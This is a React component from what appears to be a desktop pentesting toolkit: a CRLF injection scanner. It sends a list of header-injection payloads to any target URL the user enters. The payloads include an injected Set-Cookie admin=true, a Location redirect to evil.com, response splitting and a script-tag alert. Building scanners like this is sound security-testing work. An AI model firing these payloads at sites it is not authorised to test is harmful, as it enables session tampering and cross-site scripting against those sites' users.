import { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './SharedTool.module.css';
import ToolWrapper from './ToolWrapper';
import { NetworkIcon, LoadingIcon } from '../common/Icons';

export default function CRLFInjection() {
  const { addToolResult } = useStore();
  const [targetUrl, setTargetUrl] = useState('');
  const [paramName, setParamName] = useState('redirect');
  const [results, setResults] = useState<
    Array<{ payload: string; vulnerable: boolean; headers: string }>
  >([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const crlfPayloads = [
    '%0d%0aSet-Cookie:%20admin=true',
    '%0d%0aLocation:%20http://evil.com',
    '%0aSet-Cookie:%20injected=true',
    '%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK',
    '%0d%0aX-Injected:%20true',
    '\r\nSet-Cookie: admin=true',
    '%0d%0a%0d%0a<script>alert(1)</script>',
  ];

  const testCRLF = async () => {
    if (!targetUrl.trim()) {
      setError('Target URL is required');
      return;
    }

    setLoading(true);
    setError(null);
    setResults([]);

    try {
      const found: Array<{ payload: string; vulnerable: boolean; headers: string }> = [];

      for (const payload of crlfPayloads) {
        try {
          const testUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}${paramName}=${payload}`;

          const result = await window.electronAPI.net.httpFetch(testUrl, {
            method: 'GET',
            timeout: 5000,
          });

          const headers = JSON.stringify(result.headers || {});
          const vulnerable =
            headers.toLowerCase().includes('injected') ||
            headers.toLowerCase().includes('admin=true') ||
            !!(result.data && result.data.includes('<script>'));

          found.push({ payload, vulnerable, headers: vulnerable ? 'VULNERABLE!' : 'Safe' });
        } catch {
          found.push({ payload, vulnerable: false, headers: 'Error' });
        }

        await new Promise((resolve) => setTimeout(resolve, 200));
      }

      setResults(found);

      addToolResult({
        id: Date.now().toString(),
        toolName: 'CRLF Injection',
        timestamp: Date.now(),
        input: { targetUrl, paramName },
        output: found,
        success: true,
      });
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'CRLF test failed';
      setError(message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <ToolWrapper
      title="CRLF Injection Scanner"
      icon={<NetworkIcon />}
      description="Test for CRLF injection vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            placeholder="https://example.com/page"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
          />
        </div>

        <div className={styles.inputGroup}>
          <label className={styles.label}>Parameter Name</label>
          <input
            type="text"
            className={styles.input}
            placeholder="redirect"
            value={paramName}
            onChange={(e) => setParamName(e.target.value)}
          />
        </div>

        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={testCRLF} disabled={loading}>
            {loading ? (
              <>
                <LoadingIcon /> Testing...
              </>
            ) : (
              'Test CRLF'
            )}
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {loading && (
        <div className={styles.loadingBox}>
          <div className={styles.spinner}></div>
          <span>Testing CRLF injection...</span>
        </div>
      )}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>CRLF Test Results</span>
          </div>
          {results.map((result, idx) => (
            <div key={idx} className={styles.resultItem}>
              <span style={{ color: '#00ffaa', fontFamily: 'var(--font-mono)', fontSize: '12px' }}>
                {result.payload}
              </span>
              <span style={{ color: result.vulnerable ? '#ff6b8a' : '#888', marginLeft: '10px' }}>
                {result.headers}
              </span>
            </div>
          ))}
        </div>
      )}
    </ToolWrapper>
  );
}
